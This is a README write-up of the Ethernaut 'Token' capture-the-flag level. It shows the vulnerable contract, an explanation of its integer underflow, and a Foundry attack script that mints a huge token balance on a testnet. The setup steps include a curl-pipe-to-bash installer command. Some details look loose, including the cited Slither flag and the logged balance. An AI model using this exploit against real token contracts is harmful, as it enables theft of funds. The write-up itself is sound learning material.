# Ethernaut Level: Token - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Token** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/token/`) contains everything related to it.

**Goal:** Start with 20 tokens and acquire any additional tokens (preferably a very large amount) by exploiting the basic token contract.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 19, 2025 (Day 6).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This is a basic ERC20-like token contract with a fixed initial supply allocated to the deployer. The `transfer` function moves tokens but lacks proper overflow protection, allowing underflow exploits in Solidity ^0.6.0.

**Key Code Snippet (from src/Token.sol):**
```solidity
contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);  // Vulnerable: Underflow in subtraction!
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

## Vulnerability Analysis
**Main Issue: Integer Underflow (Unchecked Arithmetic)**  
- In Solidity ^0.6.0, arithmetic operations like subtraction are unchecked, so if `_value > balances[msg.sender]`, `balances[msg.sender] - _value` underflows to a huge number (2^256 - (_value - balance)). The `require` sees this huge value >= 0 (true), then `balances[msg.sender] -= _value` underflows again, resulting in a massive balance.  
- **Security Impact:** Allows minting infinite tokens, breaking the token economy. This is a classic pre-0.8.0 vulnerability; audits must flag unchecked math.  
- **Audit Tip:** Always use SafeMath library (e.g., `balances[msg.sender] = balances[msg.sender].sub(_value);`) or upgrade to ^0.8.0 for built-in checks. Tools like Slither detect this with `--detect underflow`.

**Example:** With balance=20, transfer 21: 20 - 21 underflows to ~2^256 -1. Require passes (huge >=0), then balance becomes ~2^256 -1 after final subtraction—infinite tokens!

## Solution Steps
The exploit: Transfer a value larger than your balance (e.g., 21 when balance=20) to any address (e.g., address(0)). The underflow in subtraction creates a massive balance.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/TokenSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `balanceOf(your_address)` >20 (huge number), submit on Ethernaut site.

**Key Attack Code Snippet (from script/TokenSolution.s.sol):**
```solidity
contract TokenSolution is Script {
    Token public tokenInstance = Token(<Contract_address>);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Initial balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        tokenInstance.transfer(address(0), 21);  // Underflow: 20 - 21 → massive balance!
        
        console.log("New balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }   
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates underflow and massive balance.
- **Testnet Output Example:** Console log: "Initial balance: 20", "New balance: 115792089237316195423570985008687907853269984665640564039457584007913129639795" (huge underflow result).

## Key Learnings
- **Auditing Skill:** Review all arithmetic ops for underflow/overflow—use static tools like Slither early.
- **EVM Concept:** uint256 wraps around on underflow (mod 2^256), leading to silent exploits in pre-0.8 Solidity.
- **Prevention:** Require checks before ops (`require(balance >= _value)`) + SafeMath; prefer ^0.8.0+.
- **Next Step:** Test with different overflow values (e.g., type(uint256).max - 19) for variations.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/token`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/TokenSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Delegation. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)